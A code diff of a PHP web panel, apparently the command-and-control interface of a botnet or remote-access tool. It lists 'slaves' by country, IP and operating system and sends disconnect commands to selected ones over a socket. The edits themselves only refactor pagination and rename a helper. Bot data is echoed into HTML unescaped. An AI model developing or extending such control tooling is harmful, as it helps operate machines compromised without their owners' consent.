@@ -6,14 +6,14 @@ require_once "request.php";
 $request = new Request();
 $sock = $request->createSocket();
 
-if (isset($_POST ['select']) && isset($_POST ['action'])) {
-	$action = $_POST ['action'];
+if (isset($_POST['select']) && isset($_POST['action'])) {
+	$action = $_POST['action'];
 	
 	if ($action == "disconnect") {
 		$request->write($sock, 10);
-		$request->write($sock, count($_POST ['select']));
+		$request->write($sock, count($_POST['select']));
 	}
-	foreach ( $_POST ['select'] as $slave ) {
+	foreach ($_POST['select'] as $slave) {
 		$request->write($sock, $slave);
 	}
 } else {
@@ -121,34 +121,45 @@ $(document).ready(function() {
 					 * echo "<tr>" . str_replace("%c", $i++ & 1 ? "tg-vn4c" : "tg-031e", $slave->getTableFormatted($i)) . "</tr>\n";
 					 * }
 					 */
-					function printOut($s) {
+					function printTableData($s) {
 						echo "<td>" . $s . "</td>\n";
 					}
 					
 
-					$page = isset($_GET['page']) ? $_GET['page'] : 0;
-					$max = 10;
+					$page = isset($_GET['page']) ? $_GET['page'] : "all";
 					
-					for ($i = $page * $max; $i < $page == 0 ? count($slaves) : $page * $max + $max; $i++) {
+					
+					$displayed = 0;
+					
+					if ($page == "all") {
+						$start = 0;
+						$max = count($slaves);
+					} else {
+						$page--;
 						
+						$max = 10;
+						$start = $page * $max;
+						
+						if ($page < 0) {
+							$page = 0;
+						}
+					}
+												
+					for ($i = $start; $i < $start + $max; $i++) {
 						if (!isset($slaves[$i])) {
 							break;
 						}
 						$slave = $slaves[$i];
 						
-						if (isset($_GET['page'])) {
-							$page = $_GET['page'];
-							
-							
-						}
-						
+						$displayed++;
+
 						echo "<tr>\n";
-						echo printOut($slave->getDisplayCountry());
-						echo printOut($slave->getIdentifier());
-						echo printOut($slave->getIP());
-						echo printOut($slave->getOperatingSystem());
-						echo printOut("<a href='bots.php?id=" . $slave->getUniqueId() . "'><button type='button' class='btn btn-xs btn-info'>CP</button></a>");
-						echo printOut("<input class='box' type='checkbox' name='select[$i]' value='" . $slave->getUniqueId() . "'>");
+						echo printTableData($slave->getDisplayCountry());
+						echo printTableData($slave->getIdentifier());
+						echo printTableData($slave->getIP());
+						echo printTableData($slave->getOperatingSystem());
+						echo printTableData("<a href='bots.php?id=" . $slave->getUniqueId() . "'><button type='button' class='btn btn-xs btn-info'>CP</button></a>");
+						echo printTableData("<input class='box' type='checkbox' name='select[$i]' value='" . $slave->getUniqueId() . "'>");
 						echo "</tr>\n";
 					
 					}
@@ -159,9 +170,13 @@ $(document).ready(function() {
 				<div class="form-group" align="right">
 					<div>
 						<ul class="pagination pagination-demo">
-							<li><a href="bots.php?page=0">&laquo;</a></li>
-							<li><a href='bots.php?page=1'>1</a></li>
-							<li><a href="bots.php?page=2">&raquo;</a></li>
+							<?php 				
+							$page++;
+							echo '<li><a href="index.php?page=' . ($page - 1) . '">&laquo;</a></li>';
+							echo '<li><a href="index.php?page=' . ($page) . '">' . ($page). '</a></li>';
+							echo '<li><a href="index.php?page=' . ($page + 1) . '">&raquo;</a></li>';
+							?>
+							
 						</ul>
 					</div>
 				</div>
